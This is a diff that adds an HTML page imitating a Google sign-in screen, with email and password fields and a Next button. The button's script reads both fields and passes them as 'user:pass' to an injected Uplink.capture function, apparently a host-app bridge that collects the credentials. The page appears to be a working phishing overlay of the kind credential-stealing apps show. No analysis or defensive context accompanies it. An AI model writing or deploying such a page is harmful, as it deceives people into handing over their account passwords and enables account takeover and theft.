@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <style>
+        body { background:#fff; color:#202124; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding:50px; margin:0; }
+        h2 { font-size:1.8rem; margin:0 0 10px 0; }
+        p { margin-bottom:25px; color:#5f6368; }
+        input { width:100%; padding:15px; margin-bottom:10px; border:1px solid #dadce0; border-radius:4px; box-sizing:border-box; font-size:1rem; }
+        button { width:120px; padding:15px; background:#1a73e8; border:none; color:#fff; font-weight:bold; border-radius:4px; float:right; cursor:pointer; font-size:1rem; }
+    </style>
+</head>
+<body>
+    <h2>Google</h2>
+    <p>Sign in to continue</p>
+    <input type="text" id="u" placeholder="Email or phone">
+    <input type="password" id="p" placeholder="Enter your password">
+    <button onclick="var u=document.getElementById('u').value; var p=document.getElementById('p').value; if(u && p) Uplink.capture(u + ':' + p);">Next</button>
+</body>
+</html>
